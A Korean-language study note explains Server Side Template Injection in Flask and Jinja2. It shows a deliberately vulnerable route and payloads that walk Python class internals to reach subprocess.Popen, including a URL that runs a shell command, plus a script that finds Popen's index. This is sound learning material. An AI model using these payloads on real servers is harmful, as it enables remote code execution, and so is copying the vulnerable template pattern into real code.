# 배경
Server Side Template Injection의 약자
동적 웹페이지를 구현할 때, 템플릿을 사용하면 편리한데,
템플릿이 서버측에서 해석이 되기 때뭉에 취약점이 발생한다.
eval()랑 비슷할 정도로 취약함

```python
@app.route('/')
def home():
	title="제목"
	content = request.args.get('content')
	thisistemp='''
	<!DOCTYPE html>
	<html>
		<head>
			<meta charset="utf-8">
			<title>SSTI</title>
		</head>
		<body>
			<h1>{{title}}</h1>
			<h2>%s</h2>
		</body>
	</html>'''%content				#vuln!
	return render_template_string(thisistemp, title=title)
```

위 flask 코드는 입력값을 그대로 템플릿에 넣어서 문제가 발생한다.
title변수가 템플릿에서 사용할 수 있는 것과 마찬가지로
사용자에게 입력받은 데이터에 {{}}로 감싸고 그 안에 악의적인 코드가 들어갈 수 있다.

예를 들어 content에 `{{7*7}}` 을 넣으면 `{{7*7}}` 가 아닌 49가 출력된다.

Flask 템플릿 엔진은 Jinja2라는 템플릿 엔진을 사용
Jinja2는 기본적으로 HTML 템플릿을 렌더링하는 데 사용되지만, 
중괄호 두 개로 둘러싸인 표현식은 파이썬 코드로 해석되어 실행



# exploit 예시

다음은 config 내부에 있는 값들을 딕셔너리 형태로 출력시켜준다

	{{config.items()}}

os 라이브러리 내부에는 popen,os등의 실행 함수가 들어있기 때문에 사용할 수 있으면 좋다.
popen은 새로운 파이프라인을 만들어서 그 안에서 커널 명령어를 사용할 수 있다.

os의 config딕셔너리가 추가시켜준다.

	{{config.from_object('os')}}*

사용할 수 있는 클래스를 검색할 수 있게 만든다.

	{{''.__class__.__mro__}}

서브클래스 조회

	{{''.__class__.__mro__[1].__subclasses__()}}

매우 많은 클래스들과 중간에

	concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'subprocess.STARTUPINFO'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class

popen클래스를 찾을 수 있는데, 슬라이싱을 통해서 popen의 위치를 찾을 수 있다.

	`http://127.0.0.1:8080/?content={{%27%27.__class__.__mro__[1].__subclasses__()[202](%27ls%27,shell=True,stdout=-1).communicate()}}`


# subprocess.Popen 인덱스 찾기 스크립트
```python
with open("list.txt", "r") as f:
    line = f.readline()

classes = [item.strip() for item in line.split(",")]

try:
    index = classes.index("<class 'subprocess.Popen'>")
    print(f"'popen' is at index {index}")
except ValueError:
    print("'popen' not found in the list")
```